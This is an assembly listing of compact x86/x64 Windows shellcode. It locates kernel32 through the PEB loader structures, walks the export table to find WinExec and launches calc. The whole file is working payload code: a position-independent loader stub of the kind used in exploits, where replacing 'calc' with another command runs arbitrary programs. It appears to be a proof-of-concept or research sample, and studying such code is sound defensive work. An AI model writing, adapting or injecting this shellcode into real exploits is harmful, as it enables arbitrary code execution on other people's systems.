

;
; 113 bytes
;
    bits   32

exec:
int3
    xor    ecx, ecx          ; ecx = 0
    ; -------------
    push   ecx               ; NULL
    push   'calc'            ; calc.exe
    push   esp
    pop    ebp
    ; ------------
    mul    ecx               ; eax = 0, edx = 0
    mov    dl, 10h           ; edx = 10h
    push   18h
    pop    ebx               ; ebx = 18h
    dec    eax               ; 
    jns    exe_l0
    
    push   ebp
    ; we're 32-bit
    mov    bl, 0ch
    db     64h               ; fs:
    mov    esi, [edx+20h]    ; peb = __readfsdword(0x30)
    jmp    exe_l1
exe_l0:
    db     65h               ; gs:
    dec    eax
    mov    esi, [edx+50h]    ; peb = __readgsqword(0x60)
exe_l1:    
    dec    eax
    mov    esi, [esi+ebx]    ; esi = peb->Ldr
    js     exe_l2
    mov    ebx, edx          ; ebx = 10h
exe_l2:    
    dec    eax
    mov    esi, [esi+ebx]    ; 0ch or 10h
    mov    bl, 18h
    js     exe_l3
    add    ebx, ebx
exe_l3:    
    dec    eax
    lodsd
    push   eax
    pop    edi
    
    dec    eax
    mov    edi, [edi]

    dec    eax
    mov    ebx, [edi+ebx]
    
    ; add IMAGE_DOS_HEADER.e_lfanew
    dec    eax
    add    edx, [ebx+3ch]
    
    ; edx = export directory
    dec    eax
    mov    edx, [ebx+edx+78h]
    
    ; esi = offset to AddressOfFunctions
    dec    eax
    lea    esi, [ebx+edx+1ch]
    mov    cl, 3
exe_l4:    
    lodsd
    xchg   eax, edx
    dec    eax
    add    edx, ebx
    push   edx
    loop   exe_l4
    
    pop    edi         ; edx = AddressOfNameOrdinals
    pop    esi         ; esi = AddressOfNames 
exe_l5:
    scasw
    lodsd
    cmp    dword [eax+ebx], 'WinE'
    jne    exe_l5
    
    pop    esi         ; esi = AddressOfFunctions
    
    mov    cx, [edi]
    dec    eax
	  add	   ebx, [esi+4*ecx]
    push   ebp
    pop    ecx         ; calc\0
    cdq
	  call	 ebx
    
    